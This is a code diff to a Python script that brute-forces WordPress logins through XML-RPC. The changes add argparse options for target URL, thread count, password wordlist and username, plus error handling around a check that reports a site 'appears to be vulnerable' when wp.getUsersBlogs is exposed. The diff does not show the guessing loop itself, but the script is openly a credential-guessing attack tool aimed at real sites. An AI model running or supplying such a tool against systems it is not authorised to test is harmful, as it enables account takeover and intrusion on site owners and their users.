@@ -1,27 +1,26 @@
 #!/usr/bin/python3
-import sys 
+import sys, threading, queue, signal, argparse
 import xmlrpc.client as xml
-import threading
 from time import sleep
-import queue
-import signal
 from pwn import log
 PYTHONIOENCODING='latin-1'
+parser=argparse.ArgumentParser()
+parser.add_argument("-t", "--threads", help="Number of threads", type=int, required=True)
+parser.add_argument("-u", "--url", help="Url target", required=True)
+parser.add_argument("-w", '--wordlist', help="Passwords wordlist", required=True)
+parser.add_argument("-s", '--user', help="Username to bruteforce", required=True)
+args=parser.parse_args()
+
 #ctrl + c
 def def_handler(sig, frame):
     print("\n\n[ * ] Saliendo...")
     exit(1)
 signal.signal(signal.SIGINT, def_handler)
 
-
-if len(sys.argv) !=5:
-    print("usage: %s <url> <number of threads> <pass dictionary path> <username>" % (sys.argv[0]))
-    exit(1)
-user=sys.argv[4]
-dictionary=sys.argv[3]
-threads=sys.argv[2]
-threads=int(threads)
-url=sys.argv[1]
+user=args.user
+dictionary=args.wordlist
+threads=args.threads
+url=args.url
 listMethods='<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'
 
 
@@ -31,7 +30,11 @@ getUserMethod='<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.
 connection = xml.ServerProxy(url)
 
 def vulnCheck():
-    listMethodsCall = connection._ServerProxy__request('system.listMethods',())
+    try:
+        listMethodsCall = connection._ServerProxy__request('system.listMethods',())
+    except:
+        print("Service unavailable or protocol error. Please, check the url")
+        exit(1)
 
     if 'wp.getUsersBlogs' in listMethodsCall:
         print("Appears to be vulnerable...")
